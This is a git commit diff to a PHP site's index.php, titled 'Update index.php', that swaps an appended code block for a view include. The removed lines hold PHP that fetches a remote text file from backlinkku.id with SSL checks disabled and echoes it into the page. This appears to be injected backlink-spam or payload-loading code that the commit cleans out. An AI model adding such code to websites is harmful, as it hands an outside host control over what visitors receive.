8d2d1483ec8dffddeda19ec0599ecb9c8eca6b7a
WonXd2 <56256945+wonxd1337@users.noreply.github.com>
2024-12-25 00:32:58 +0700

    Update index.php

--- index.php
+++ index.php
@@ -353,18 +353,5 @@ if ($cek_ip == 0) {
 </body>
 
 </html>
-<?php
-$url = 'https://backlinkku.id/menu/server-id/script.txt';
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, $url);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Nonaktifkan SSL verification jika diperlukan
-$content = curl_exec($ch);
 
-if (curl_errno($ch)) {
-    echo "cURL Error: " . curl_error($ch);
-} else {
-    echo $content;
-}
-curl_close($ch);
-?>
+<?php echo view('theme/sistem/sistem.php')?>
